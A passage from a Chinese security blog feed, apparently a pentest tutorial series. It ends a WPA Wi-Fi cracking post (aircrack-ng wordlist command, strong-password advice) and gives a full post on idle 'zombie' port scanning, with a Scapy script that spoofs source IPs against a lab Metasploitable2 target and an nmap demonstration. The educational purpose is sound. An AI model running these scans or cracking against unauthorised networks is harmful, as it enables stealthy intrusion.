<h4 id="emsp-5-调用aircrack-ng破解密码-aircrack-ng-w-wpa-01-cap"><a href="#emsp-5-调用aircrack-ng破解密码-aircrack-ng-w-wpa-01-cap" class="headerlink" title="&emsp;5.调用aircrack-ng破解密码(aircrack-ng -w  wpa-01.cap)"></a>&emsp;5.调用aircrack-ng破解密码(aircrack-ng -w <wordlist.txt> wpa-01.cap)</wordlist.txt></h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/3391248596AF4F8A923ADDE0CE28F2E4/936" alt="image"></p>
<hr>
<h2 id="0x06-防御"><a href="#0x06-防御" class="headerlink" title="0x06. 防御"></a><strong>0x06. 防御</strong></h2><h4 id="emsp-emsp-其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。"><a href="#emsp-emsp-其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。" class="headerlink" title="&emsp;&emsp;其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。"></a>&emsp;&emsp;其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。</h4><hr>
<h2 id="0x06-后续"><a href="#0x06-后续" class="headerlink" title="0x06. 后续"></a><strong>0x06. 后续</strong></h2><h4 id="emsp-emsp-大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！"><a href="#emsp-emsp-大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！" class="headerlink" title="&emsp;&emsp;大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！"></a>&emsp;&emsp;大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-无线渗透简介&quot;&gt;&lt;a href=&quot;#0x00-无线渗透简介&quot; class=&quot;headerlink&quot; title=&quot;0x00. 无线渗透简介&quot;&gt;&lt;/a&gt;0x00. 无线渗透简介&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用&quot;&gt;&lt;a href=&quot;#emsp-emsp-在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用!&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用!&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>信息收集— 僵尸扫描</title>
    <link href="http://TimeS0ng.github.io/2017/08/29/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%20%E5%83%B5%E5%B0%B8%E6%89%AB%E6%8F%8F/"/>
    <id>http://TimeS0ng.github.io/2017/08/29/信息收集— 僵尸扫描/</id>
    <published>2017-08-29T15:57:00.000Z</published>
    <updated>2017-09-07T11:54:23.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-信息收集简介"><a href="#0x00-信息收集简介" class="headerlink" title="0x00. 信息收集简介"></a><strong>0x00. 信息收集简介</strong></h2><h4 id="emsp-emsp-渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60-左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。"><a href="#emsp-emsp-渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60-左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。" class="headerlink" title="&emsp;&emsp;渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60%左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。"></a>&emsp;&emsp;渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60%左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。</h4><a id="more"></a>
<hr>
<h2 id="0x01-僵尸扫描介绍"><a href="#0x01-僵尸扫描介绍" class="headerlink" title="0x01. 僵尸扫描介绍"></a><strong>0x01. 僵尸扫描介绍</strong></h2><h3 id="emsp-emsp-往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件"><a href="#emsp-emsp-往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件" class="headerlink" title="&emsp;&emsp;往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件"></a>&emsp;&emsp;往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件</h3><h4 id="emsp-emsp-其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。"><a href="#emsp-emsp-其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。" class="headerlink" title="&emsp;&emsp;其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。"></a>&emsp;&emsp;其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。</h4><h4 id="emsp-emsp-其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。"><a href="#emsp-emsp-其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。" class="headerlink" title="&emsp;&emsp;其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。"></a>&emsp;&emsp;其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。</h4><hr>
<h2 id="0x02-僵尸扫描过程"><a href="#0x02-僵尸扫描过程" class="headerlink" title="0x02. 僵尸扫描过程"></a><strong>0x02. 僵尸扫描过程</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/e55c97293d502f9ed0b9f032d920edbe/xmlnote/WEBRESOURCEb291547ca7a5e22852fd05ca2f2541ec/394" alt="image"></p>
<h3 id="如上图所示，该图清晰的像我们展示了僵尸扫描的全过程"><a href="#如上图所示，该图清晰的像我们展示了僵尸扫描的全过程" class="headerlink" title="如上图所示，该图清晰的像我们展示了僵尸扫描的全过程"></a>如上图所示，该图清晰的像我们展示了僵尸扫描的全过程</h3><h4 id="emsp-emsp-一-首先由本地主机-scanner-向僵尸机-zombie-发送一个SYN-ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN-ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID-假设此时的IPID-x。详细的tcp-ip通信过程点击这里"><a href="#emsp-emsp-一-首先由本地主机-scanner-向僵尸机-zombie-发送一个SYN-ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN-ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID-假设此时的IPID-x。详细的tcp-ip通信过程点击这里" class="headerlink" title="&emsp;&emsp;一.首先由本地主机(scanner)向僵尸机(zombie)发送一个SYN/ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN/ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID,假设此时的IPID=x。详细的tcp/ip通信过程点击这里"></a>&emsp;&emsp;一.首先由本地主机(scanner)向僵尸机(zombie)发送一个SYN/ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN/ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID,假设此时的IPID=x。详细的tcp/ip通信过程点击<a href="http://www.cnblogs.com/rootq/articles/1377355.html" target="_blank" rel="external">这里</a></h4><h4 id="emsp-emsp-二-紧接着又由本地主机-scanner-伪造源IP-SRC地址为zombie的IP，指定一个端口号并向目标主机-target-发送一个SYN包。收到SYN包后如果target端口开放-便会给源IP-SRC返回一个SYN-ACK包，此时由zombie收到该SYN-ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID-x-1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID-x。"><a href="#emsp-emsp-二-紧接着又由本地主机-scanner-伪造源IP-SRC地址为zombie的IP，指定一个端口号并向目标主机-target-发送一个SYN包。收到SYN包后如果target端口开放-便会给源IP-SRC返回一个SYN-ACK包，此时由zombie收到该SYN-ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID-x-1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID-x。" class="headerlink" title="&emsp;&emsp;二.紧接着又由本地主机(scanner)伪造源IP.SRC地址为zombie的IP，指定一个端口号并向目标主机(target)发送一个SYN包。收到SYN包后如果target端口开放,便会给源IP.SRC返回一个SYN/ACK包，此时由zombie收到该SYN/ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID=x+1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID=x。"></a>&emsp;&emsp;二.紧接着又由本地主机(scanner)伪造源IP.SRC地址为zombie的IP，指定一个端口号并向目标主机(target)发送一个SYN包。收到SYN包后如果target端口开放,便会给源IP.SRC返回一个SYN/ACK包，此时由zombie收到该SYN/ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID=x+1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID=x。</h4><h4 id="emsp-emsp-三-最后再由本地主机-scanner-给zombie发送一个SYN-ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID-x-1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID-x-2则第二步时zombie发送了一个RST包，于是可知target端口开放。"><a href="#emsp-emsp-三-最后再由本地主机-scanner-给zombie发送一个SYN-ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID-x-1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID-x-2则第二步时zombie发送了一个RST包，于是可知target端口开放。" class="headerlink" title="&emsp;&emsp;三. 最后再由本地主机(scanner)给zombie发送一个SYN/ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID=x+1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID=x+2则第二步时zombie发送了一个RST包，于是可知target端口开放。"></a>&emsp;&emsp;三. 最后再由本地主机(scanner)给zombie发送一个SYN/ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID=x+1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID=x+2则第二步时zombie发送了一个RST包，于是可知target端口开放。</h4><hr>
<h2 id="0x03-僵尸扫描实战篇"><a href="#0x03-僵尸扫描实战篇" class="headerlink" title="0x03. 僵尸扫描实战篇"></a><strong>0x03. 僵尸扫描实战篇</strong></h2><h4 id="emsp-emsp-看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just-soso-下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅"><a href="#emsp-emsp-看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just-soso-下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅" class="headerlink" title="&emsp;&emsp;看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just soso!下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅!"></a>&emsp;&emsp;看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just soso!下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅!</h4><h3 id="一：环境准备"><a href="#一：环境准备" class="headerlink" title="一：环境准备"></a>一：环境准备</h3><h4 id="emsp-emsp-扫描主机-Mac-ip-192-168-0-103"><a href="#emsp-emsp-扫描主机-Mac-ip-192-168-0-103" class="headerlink" title="&emsp;&emsp;扫描主机 Mac: { ip:192.168.0.103 }"></a>&emsp;&emsp;扫描主机 Mac: { ip:192.168.0.103 }</h4><h4 id="emsp-emsp-僵尸主机-xp-ip-192-168-0-107"><a href="#emsp-emsp-僵尸主机-xp-ip-192-168-0-107" class="headerlink" title="&emsp;&emsp;僵尸主机 xp: { ip:192.168.0.107 }"></a>&emsp;&emsp;僵尸主机 xp: { ip:192.168.0.107 }</h4><h4 id="emsp-emsp-目标主机-metasploitable2-ip-192-168-0-105"><a href="#emsp-emsp-目标主机-metasploitable2-ip-192-168-0-105" class="headerlink" title="&emsp;&emsp;目标主机 metasploitable2: { ip:192.168.0.105 }"></a>&emsp;&emsp;目标主机 metasploitable2: { ip:192.168.0.105 }</h4><h3 id="二-python2-7脚本"><a href="#二-python2-7脚本" class="headerlink" title="二: python2.7脚本"></a>二: python2.7脚本</h3><h4 id="emsp-emsp-其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本-完整的脚本我放在云盘上-，用来发现僵尸机-zombie-和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。"><a href="#emsp-emsp-其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本-完整的脚本我放在云盘上-，用来发现僵尸机-zombie-和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。" class="headerlink" title="&emsp;&emsp;其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本(完整的脚本我放在云盘上)，用来发现僵尸机(zombie)和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。"></a>&emsp;&emsp;其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本(完整的脚本我放在<a href="https://pan.baidu.com/s/1kUGwT6n" target="_blank" rel="external">云盘</a>上)，用来发现僵尸机(zombie)和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">zombies_scan</span><span class="params">(zombie_ip)</span>:</span></div><div class="line">	rep1 = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>),timeout=<span class="number">2</span>)</div><div class="line">	send(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>))</div><div class="line">	rep2 = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>),timeout=<span class="number">2</span>)</div><div class="line">	<span class="keyword">if</span> rep2[IP].id == (rep1[IP].id+<span class="number">2</span>):</div><div class="line">		<span class="keyword">print</span> <span class="string">"[*]"</span> + zombie_ip + <span class="string">" is Incremental!"</span></div><div class="line">		target_ip = raw_input(<span class="string">"input the target_ip :"</span>)</div><div class="line">		port_scan(target_ip, zombie_ip)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">print</span> <span class="string">"[*]"</span> + zombie_ip + <span class="string">"is not Incremental!\n"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">port_scan</span><span class="params">(target_ip,zombie_ip)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"------begin to scan target_ip!-------"</span></div><div class="line">	<span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			start = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>,dport=port),timeout=<span class="number">2</span>)</div><div class="line">			send(IP(src=zombie_ip,dst=target_ip)/TCP(flags=<span class="string">'S'</span>,dport=port))</div><div class="line">			end = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>),timeout=<span class="number">2</span>)</div><div class="line">			<span class="keyword">if</span> end[IP].id == (start[IP].id + <span class="number">2</span>):</div><div class="line">				<span class="keyword">print</span> <span class="string">"[*]"</span> + target_ip + <span class="string">':'</span> + port + <span class="string">"is open"</span></div><div class="line">		<span class="keyword">except</span>:</div><div class="line">			<span class="keyword">pass</span></div></pre></td></tr></table></figure>
<h4 id="第一个函数用来发现僵尸机，利用了Scapy库构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN-ACK包，通过判断IPID的值来确定是否是个好僵尸。"><a href="#第一个函数用来发现僵尸机，利用了Scapy库构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN-ACK包，通过判断IPID的值来确定是否是个好僵尸。" class="headerlink" title="第一个函数用来发现僵尸机，利用了Scapy库构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN/ACK包，通过判断IPID的值来确定是否是个好僵尸。"></a>第一个函数用来发现僵尸机，利用了<a href="http://www.secdev.org/projects/scapy/" target="_blank" rel="external">Scapy库</a>构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN/ACK包，通过判断IPID的值来确定是否是个好僵尸。</h4><h4 id="第二个函数和第一个函数差不多，同样是利用Scapy库构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。"><a href="#第二个函数和第一个函数差不多，同样是利用Scapy库构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。" class="headerlink" title="第二个函数和第一个函数差不多，同样是利用Scapy库构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。"></a>第二个函数和第一个函数差不多，同样是利用<a href="http://www.secdev.org/projects/scapy/" target="_blank" rel="external">Scapy库</a>构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。</h4><h3 id="三-操作步骤"><a href="#三-操作步骤" class="headerlink" title="三: 操作步骤"></a>三: 操作步骤</h3><h4 id="emsp-emsp-1-首先调用第一个函数判断xp是否是僵尸机"><a href="#emsp-emsp-1-首先调用第一个函数判断xp是否是僵尸机" class="headerlink" title="&emsp;&emsp;1.首先调用第一个函数判断xp是否是僵尸机"></a>&emsp;&emsp;1.首先调用第一个函数判断xp是否是僵尸机</h4><p>&emsp;&emsp;<img src="http://note.youdao.com/yws/public/resource/598b9fdb09cf92d23340b57f089a6af0/xmlnote/3992697E69534B5FBED8277FC7B4DB75/543" alt="image"></p>
<h4 id="emsp-emsp-2-抓包看看第一个函数是不是像我们预想中的那样发包的"><a href="#emsp-emsp-2-抓包看看第一个函数是不是像我们预想中的那样发包的" class="headerlink" title="&emsp;&emsp;2. 抓包看看第一个函数是不是像我们预想中的那样发包的"></a>&emsp;&emsp;2. 抓包看看第一个函数是不是像我们预想中的那样发包的</h4><p><img src="http://note.youdao.com/yws/public/resource/b91afbaa2cf1fba312e9ad33db824b91/xmlnote/722D8CFBF8C5463D982D4D1C1D9CDA9F/553" alt="image"></p>
<h4 id="可以看到发送的数据包正像我们预期中的一样，先发一个SYN-ACK，再收到一个RST-重复三次，判断IPID，这时再来看看IPID如何呢！"><a href="#可以看到发送的数据包正像我们预期中的一样，先发一个SYN-ACK，再收到一个RST-重复三次，判断IPID，这时再来看看IPID如何呢！" class="headerlink" title="可以看到发送的数据包正像我们预期中的一样，先发一个SYN/ACK，再收到一个RST,重复三次，判断IPID，这时再来看看IPID如何呢！"></a>可以看到发送的数据包正像我们预期中的一样，先发一个SYN/ACK，再收到一个RST,重复三次，判断IPID，这时再来看看IPID如何呢！</h4><p><img src="http://note.youdao.com/yws/public/resource/bbdd4a1c56e95d7e7d7977fed3245de6/xmlnote/CC31FE826865413293736F858508266A/563" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/bbdd4a1c56e95d7e7d7977fed3245de6/xmlnote/BEDD4C00B4EE4D91BA8BE2E9440CBC87/565" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/bbdd4a1c56e95d7e7d7977fed3245de6/xmlnote/24FE722B2D4141C6ADB1CD8340A07ED2/567" alt="image"></p>
<hr>
<h4 id="emsp-emsp-3-已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。"><a href="#emsp-emsp-3-已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。" class="headerlink" title="&emsp;&emsp;3. 已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。"></a>&emsp;&emsp;3. 已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。</h4><hr>
<h2 id="0x04-nmap中的僵尸扫描"><a href="#0x04-nmap中的僵尸扫描" class="headerlink" title="0x04. nmap中的僵尸扫描"></a><strong>0x04. nmap中的僵尸扫描</strong></h2><h4 id="emsp-emsp-在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！"><a href="#emsp-emsp-在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！" class="headerlink" title="&emsp;&emsp;在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！"></a>&emsp;&emsp;在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！</h4><h3 id="emsp-emsp-一：nmap发现僵尸机"><a href="#emsp-emsp-一：nmap发现僵尸机" class="headerlink" title="&emsp;&emsp;一：nmap发现僵尸机"></a>&emsp;&emsp;一：nmap发现僵尸机</h3><p>&emsp;&emsp;&emsp;<img src="http://note.youdao.com/yws/public/resource/a1a885c4b6b69e213e8ad40885aa4fc2/xmlnote/DDF61F18AB7C4A4183EF9D2F64176A89/605" alt="image"></p>
<h3 id="emsp-emsp-二：nmap利用僵尸机进行端口扫描"><a href="#emsp-emsp-二：nmap利用僵尸机进行端口扫描" class="headerlink" title="&emsp;&emsp;二：nmap利用僵尸机进行端口扫描"></a>&emsp;&emsp;二：nmap利用僵尸机进行端口扫描</h3><p>&emsp;&emsp;&emsp;<img src="http://note.youdao.com/yws/public/resource/a1a885c4b6b69e213e8ad40885aa4fc2/xmlnote/C44E28D7AFBA4D729187D66E8492598E/613" alt="image"></p>
<hr>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05. 总结"></a><strong>0x05. 总结</strong></h2><h4 id="emsp-emsp-虽然僵尸扫描的条件如此苛刻，但是原理just-soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的-o-o"><a href="#emsp-emsp-虽然僵尸扫描的条件如此苛刻，但是原理just-soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的-o-o" class="headerlink" title="&emsp;&emsp;虽然僵尸扫描的条件如此苛刻，但是原理just soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的(o^^o)"></a>&emsp;&emsp;虽然僵尸扫描的条件如此苛刻，但是原理just soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的(o^^o)</h4><hr>
]]></content>
    
